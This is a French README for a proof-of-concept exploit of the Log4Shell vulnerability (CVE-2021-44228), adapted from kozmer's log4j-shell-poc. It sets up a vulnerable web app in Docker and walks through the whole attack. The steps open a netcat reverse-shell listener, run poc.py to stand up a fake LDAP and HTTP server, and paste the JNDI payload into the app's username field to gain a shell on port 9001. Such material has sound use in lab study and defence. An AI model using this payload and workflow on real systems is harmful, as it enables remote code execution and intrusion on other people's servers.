# log4j-shell-poc

Voici une preuve de concept pour la vulnérabilité CVE-2021-44228

Ce travail repose essentiellement sur les travaux de réaliser sur le Git Hub suivant : https://github.com/kozmer/log4j-shell-poc

Dans ce dépôt, il y a un :
* Un exemple d'application web vulnérable qui pourra être exécuté grâce au conteneur docker. 
* Un exploit de preuve de concept, le fichier poc.py

### Mise en place de l’environnement :

Installer les bibliothèques python nécessaire à l'exécution de l'exploite poc.py :
```py
pip install -r requirements.txt
```

Créer l'image du conteneur qui exécutera l'application vulnérable :
```bash
docker build -t log4j-shell-poc
```

### Exécution de l’attaque :

Démarrer netcat pour accepter une connexion reverse shell :
``` bash
nc -lvnp 9001
```

Démarrer l'application web vulnérable : 
```bash
docker run --network host log4j-shell-poc
```
Lancer l'exploit :
```py
$ python3 poc.py --userip localhost --webport 8000 --lport 9001

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

[+] Exploit java class created success
[+] Setting up fake LDAP server

[+] Send me: ${jndi:ldap://localhost:1389/a}

Listening on 0.0.0.0:1389
```

Ce script va configurer le serveur HTTP et le serveur LDAP de l'attaquant, et il va également créer la charge utile que vous pouvez utiliser pour coller dans le paramètre vulnérable.
Cette charge utile doit être copiée dans la partie nom d’utilisateur de l'application vulnérable à l'adresse : http://localhost:8080/
 Après cela, si tout s'est bien passé, vous devriez obtenir un shell sur le por 9001.

### Récupération des logs de l’attaque : 
Les logs du serveur se trouvent dans le conteneur Docker.  Vous pouvez exécuter les commandes suivantes pour les copier-coller logs sur le machin hôte :
Démarrer l'application web vulnérable : 
```bash
#commande ci-dessous à exécuter depuis l’hôte
docker cp container_id:/usr/local/tomcat/logs /PathHôte #commandes ci-dessous sont à exécuter depuis l’hôte
```
### Quelque détail sur le fonctionnement :
Nous avons choisi l'archive vulnérable `jdk1.8.0_20`.
